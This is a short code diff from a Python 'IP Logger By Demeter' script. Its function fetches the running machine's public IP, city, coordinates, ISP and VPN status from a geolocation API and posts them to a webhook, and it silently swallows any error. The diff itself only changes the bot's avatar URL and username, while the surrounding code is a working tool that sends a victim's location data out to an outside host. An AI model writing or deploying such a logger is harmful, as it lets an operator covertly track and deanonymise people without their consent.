@@ -10,7 +10,7 @@ def ip():
     api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
     data = requests.get(api).json()
     content = f"```IP Logger By Demeter \nIP: {data['query']}\nRegion: {data['regionName']}\nRegion: {data['city']}\nLatitude: {data['lat']}\nLongitude: {data['lon']}\nISP: {data['isp']}\nVPN?: {data['proxy']}```**Demeter Python IP Logger**"
-    requests.post(webhook, json={"avatar_url":"https://bigrat.monster/",'username': 'Wow Ip Logger', 'content': content})
+    requests.post(webhook, json={"avatar_url":"https://tr.web.img3.acsta.net/newsv7/22/06/06/12/55/1351845.jpg",'username': 'Demeter IP Logger Bot', 'content': content})
   except:
     pass
 
